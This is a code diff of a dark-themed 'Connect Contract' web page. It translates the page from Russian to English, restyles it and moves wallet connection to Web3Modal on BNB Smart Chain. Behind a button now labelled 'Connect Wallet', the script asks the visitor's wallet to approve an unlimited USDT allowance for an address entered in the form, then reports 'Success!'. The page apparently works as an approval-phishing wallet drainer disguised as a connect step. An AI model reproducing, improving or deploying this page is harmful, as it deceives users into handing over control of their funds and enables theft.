@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <title>Connect Contract</title>
@@ -8,7 +8,7 @@
   <style>
     body {
       margin: 0;
-      font-family: system-ui, sans-serif;
+      font-family: "Inter", system-ui, sans-serif;
       background: #0b0c10;
       color: #e5e5e5;
       display: flex;
@@ -19,39 +19,48 @@
 
     .card {
       background: #1f2833;
-      padding: 30px;
-      border-radius: 14px;
-      width: 90%;
+      padding: 32px;
+      border-radius: 18px;
+      width: 92%;
       max-width: 420px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      box-shadow: 0 0 30px rgba(0,0,0,0.45);
       text-align: center;
     }
 
     h1 {
-      margin-bottom: 20px;
-      font-size: 24px;
+      margin-bottom: 24px;
+      font-size: 26px;
       color: #66fcf1;
+      font-weight: 600;
+    }
+
+    label {
+      display: block;
+      text-align: left;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #c5c6c7;
     }
 
     input {
       width: 100%;
-      padding: 12px;
-      border-radius: 8px;
+      padding: 14px;
+      border-radius: 10px;
       border: 1px solid #45a29e;
       background: #0b0c10;
       color: #e5e5e5;
-      margin-bottom: 16px;
-      font-size: 14px;
+      margin-bottom: 20px;
+      font-size: 15px;
     }
 
     button {
       width: 100%;
-      padding: 14px;
+      padding: 15px;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       background: #45a29e;
       color: #0b0c10;
-      font-size: 16px;
+      font-size: 17px;
       font-weight: 600;
       cursor: pointer;
       transition: 0.2s;
@@ -62,13 +71,13 @@
     }
 
     .status {
-      margin-top: 18px;
+      margin-top: 20px;
       font-size: 13px;
       color: #c5c6c7;
       white-space: pre-wrap;
       background: #0b0f16;
-      padding: 12px;
-      border-radius: 8px;
+      padding: 14px;
+      border-radius: 10px;
       border: 1px solid #1f2833;
     }
   </style>
@@ -78,19 +87,20 @@
   <div class="card">
     <h1>Connect Contract</h1>
 
-    <input id="spender" placeholder="Адрес контракта" />
+    <label>Contract address:</label>
+    <input id="spender" placeholder="0x..." />
 
-    <button id="connectBtn">Подключить</button>
+    <button id="connectBtn">Connect Wallet</button>
 
-    <div id="status" class="status">Ожидание действия.</div>
+    <div id="status" class="status">Waiting for action…</div>
   </div>
 
-  <!-- ethers.js (Cloudflare CDN — безопасный для GitHub Pages) -->
+  <!-- ethers.js -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.umd.min.js"></script>
 
   <!-- Web3Modal v3 -->
-  <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.umd.js"></script>
-  <script src="https://unpkg.com/@web3modal/standalone@3.0.1/dist/index.umd.js"></script>
+  <script src="https://unpkg.com/@web3modal/wallet@3.5.7"></script>
+  <script src="https://unpkg.com/@web3modal/standalone@3.5.7"></script>
 
   <script>
     const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
@@ -104,13 +114,11 @@
       }
     ];
 
-    const projectId = "a6f8c1b4c1f3f0d9e8b2c7a4f1d2e3b4"; 
-    // (это публичный демо-ID, можно оставить)
+    const projectId = "a6f8c1b4c1f3f0d9e8b2c7a4f1d2e3b4"; // demo ID
 
-    const web3Modal = new window.Web3Modal.StandaloneWeb3Modal({
+    const modal = new window.Web3Modal.StandaloneWeb3Modal({
       projectId,
-      walletConnectVersion: 2,
-      chains: [56], // BSC Mainnet
+      chains: [56],
       themeMode: "dark"
     });
 
@@ -125,23 +133,12 @@
       try {
         const spender = document.getElementById("spender").value.trim();
         if (!spender) {
-          setStatus("Введите адрес контракта.");
+          setStatus("Enter contract address.");
           return;
         }
 
-        let ethProvider;
-
-        if (window.ethereum) {
-          // Расширение (MetaMask / Rabby / Trust / OKX)
-          await window.ethereum.request({ method: "eth_requestAccounts" });
-          ethProvider = window.ethereum;
-        } else {
-          // Мобильные кошельки через WalletConnect
-          const session = await web3Modal.openModal();
-          ethProvider = new window.WalletConnectModal.WalletConnectModalSign({
-            projectId
-          });
-        }
+        const session = await modal.openModal();
+        const ethProvider = await modal.getWalletProvider();
 
         provider = new ethers.BrowserProvider(ethProvider);
         signer = await provider.getSigner();
@@ -149,16 +146,16 @@
         const token = new ethers.Contract(tokenAddress, abi, signer);
         const max = ethers.MaxUint256;
 
-        setStatus("Отправка транзакции...");
+        setStatus("Sending transaction…");
         const tx = await token.approve(spender, max);
 
-        setStatus("Ожидание подтверждения...\nTx: " + tx.hash);
+        setStatus("Waiting for confirmation…\nTx: " + tx.hash);
         await tx.wait();
 
-        setStatus("Готово. Контракт подключён.\nTx: " + tx.hash);
+        setStatus("Success!\nTx: " + tx.hash);
 
       } catch (e) {
-        setStatus("Ошибка: " + (e.reason || e.message || e));
+        setStatus("Error: " + (e.reason || e.message || e));
       }
     }
 
